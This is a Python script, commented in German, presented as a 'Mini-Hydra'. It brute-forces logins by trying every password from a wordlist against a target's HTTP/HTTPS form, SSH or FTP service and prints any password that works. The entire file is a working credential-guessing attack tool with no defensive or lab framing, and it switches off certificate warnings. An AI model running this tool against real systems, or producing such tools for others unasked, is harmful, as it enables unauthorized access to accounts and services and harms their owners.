import argparse
import ftplib
import sys
import paramiko
import requests

# Warnungen bei unsicheren HTTPS-Zertifikaten unterdrücken
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def test_http(target, username, password, is_https=False):
  proto = "https" if is_https else "http"
  url = f"{proto}://{target}"
  data = {"username": username, "password": password}  # Anpassen je nach Formular!
  try:
    response = requests.post(url, data=data, timeout=5, verify=False)
    # Beispiel: Wenn "Invalid" nicht in der Antwort steht, war es vermutlich erfolgreich
    if "Invalid" not in response.text and response.status_code == 200:
      return True
  except Exception:
    pass
  return False


def test_ssh(target, username, password):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    ssh.connect(target, username=username, password=password, timeout=3)
    ssh.close()
    return True
  except Exception:
    return False


def test_ftp(target, username, password):
  try:
    ftp = ftplib.FTP(timeout=3)
    ftp.connect(target, 21)
    ftp.login(username, password)
    ftp.quit()
    return True
  except Exception:
    return False


def main():
  parser = argparse.ArgumentParser(
     description="Mini-Hydra in Python für verschiedene Protokolle."
  )
  parser.add_argument(
     "-t", "--target", required=True, help="Ziel-IP oder Domain"
  )
  parser.add_argument(
     "-p",
     "--proto",
     required=True,
     choices=["http", "https", "ssh", "ftp"],
     help="Protokoll",
  )
  parser.add_argument(
     "-u", "--user", required=True, help="Einzelner Benutzername"
  )
  parser.add_argument(
     "-l", "--list", required=True, help="Pfad zur Passwort-Liste (TXT)"
  )

  args = parser.parse_args()

  # Passwort-Datei einlesen
  try:
    with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
      passwords = [line.strip() for line in f if line.strip()]
  except FileNotFoundError:
    print(f"[-] Fehler: Passwort-Datei '{args.list}' nicht gefunden.")
    sys.exit(1)

  print(
     f"[*] Starte Brute-Force auf {args.target} ({args.proto.upper()}) mit"
     f" Benutzer '{args.user}'..."
  )

  for pwd in passwords:
    success = False

    if args.proto == "http":
      success = test_http(args.target, args.user, pwd, is_https=False)
    elif args.proto == "https":
      success = test_http(args.target, args.user, pwd, is_https=True)
    elif args.proto == "ssh":
      success = test_ssh(args.target, args.user, pwd)
    elif args.proto == "ftp":
      success = test_ftp(args.target, args.user, pwd)

    if success:
      print(f"\n[+] TREFFER GEFUNDEN! Passwort lautet: {pwd}")
      sys.exit(0)
    else:
      print(f"[-] Getestet: {pwd}", end="\r")

  print("\n[-] Kein gültiges Passwort in der Liste gefunden.")


if __name__ == "__main__":
  main()